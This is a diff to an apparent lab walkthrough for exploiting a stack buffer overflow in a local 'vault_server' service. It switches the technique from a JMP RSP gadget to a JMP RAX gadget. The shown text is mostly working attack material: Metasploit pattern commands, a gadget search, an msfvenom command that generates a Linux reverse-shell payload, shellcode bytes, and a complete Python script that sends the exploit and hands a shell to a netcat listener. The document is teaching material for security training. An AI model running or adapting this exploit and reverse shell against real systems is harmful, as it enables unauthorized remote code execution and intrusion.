@@ -52,13 +52,13 @@ Once the service crashes, you need to find the exact offset.
 
 1. Generate a cyclic pattern:
 ```bash
-msf-pattern_create -l 800
+/opt/metasploit-framework/bin/msf-pattern_create -l 800
 ```
 2. Send the pattern using a modified fuzzer or netcat.
 3. Check the crash in GDB or the system logs to see what overwrote `RIP` (e.g., `0x3965413865413765`).
 4. Find the offset:
 ```bash
-msf-pattern_offset -q 0x3965413865413765
+/opt/metasploit-framework/bin/msf-pattern_offset -q 0x3965413865413765
 # Result: Exact match at offset 520
 ```
 
@@ -133,10 +133,10 @@ print("[+] Sent. Inspect memory in GDB to see where it truncates!")
 ---
 
 ## 4. Gadget Hunting
-Find the `JMP RSP` gadget to redirect execution.
+Find a `JMP RAX` or `CALL RAX` gadget. Because `strcpy` returns the buffer address in `RAX`, jumping to `RAX` executes the start of our buffer!
 ```bash
-objdump -d /srv/labs/lab04/bin/vault_server | grep -i 'jmp.*%rsp'
-# Expected output: 40058a: ff e4  jmp *%rsp
+objdump -d /srv/labs/lab04/bin/vault_server | grep -iE 'jmp.*%rax|call.*%rax'
+# Expected output: 40053c: ff e0  jmp *%rax
 ```
 
 ---
@@ -164,9 +164,6 @@ target_ip = "127.0.0.1"
 target_port = 9999
 offset = 520
 
-# Address of JMP RSP gadget (converted to little-endian)
-jmp_rsp = struct.pack('<Q', 0x40058a) 
-
 # =======================================================================
 # PASTE MSFVENOM SHELLCODE HERE
 # Command: msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00\x0a\x0d\x2b" -f python -v shellcode
@@ -182,18 +179,25 @@ shellcode += b"\x35\xdd\x6d\xc2\xba\x81\x63\xe8\x35\x85\x30\x94"
 shellcode += b"\xfe\x93\x6e\xa9\x2c\xd6\x7c\x5b\xdc\xb4\xc8\x2a"
 # =======================================================================
 
-# NOP sled allows the CPU to "slide" into the decoded shellcode safely
-nop_sled = b"\x90" * 32 
+# Address of JMP RAX (from objdump)
+jmp_rax = struct.pack('<Q', 0x40053c) 
 
-payload = b"AUTH " + (b"A" * offset) + jmp_rsp + nop_sled + shellcode
+nop_sled = b"\x90" * 32
 
-print(f"[*] Sending final exploit to {target_ip}:{target_port}...")
+# Assemble payload: NOPS + Shellcode + Padding to offset + JMP RAX
+# The JMP RAX address has null bytes which terminates strcpy, but our shellcode is already safely in the buffer!
+buffer_content = nop_sled + shellcode
+padding = b"A" * (offset - len(buffer_content))
+
+payload = b"AUTH " + buffer_content + padding + jmp_rax
+
+print("[*] Launching exploit...")
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((target_ip, target_port))
 s.recv(1024)
 s.send(payload)
 s.close()
-print("[+] Exploit fired! Check your netcat listener for the shell.")
+print("[+] Exploit sent! Check your netcat listener.")
 ```
 
 4. Run the exploit script. Your listener will catch the shell as the `lab04` user.
